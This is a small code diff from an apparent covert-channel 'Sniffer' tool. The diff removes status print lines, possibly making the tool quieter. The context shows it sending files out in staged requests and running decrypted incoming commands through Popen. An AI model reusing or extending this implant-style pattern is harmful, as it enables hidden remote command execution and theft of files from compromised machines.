@@ -27,8 +27,6 @@ class Command:
             mimetype = mimetypes.guess_type(file_path)[0]
             head_data = "1" if mimetype != None and mimetype.startswith("text/") else "0"
 
-            print("[Sniffer] Beginning file transfer...")
-
             # send HEAD request
             head = Request(RequestType.DATA)
             head.send(options={
@@ -37,8 +35,6 @@ class Command:
                 "filename": filename,
                 "data": head_data
             })
-
-            print("[Sniffer] Now transferring file data...")
 
             # send NORMAL requests
             packet_number = 1
@@ -66,8 +62,7 @@ class Command:
                 "filename": filename,
                 "data": "" # value does not matter for tail
             })
-            
-            print("[Sniffer] File transfer has completed.")
+
         else:
             process = Popen(decrypted.split(), stdout=PIPE, stderr=PIPE)
             stdout, stderr = process.communicate()
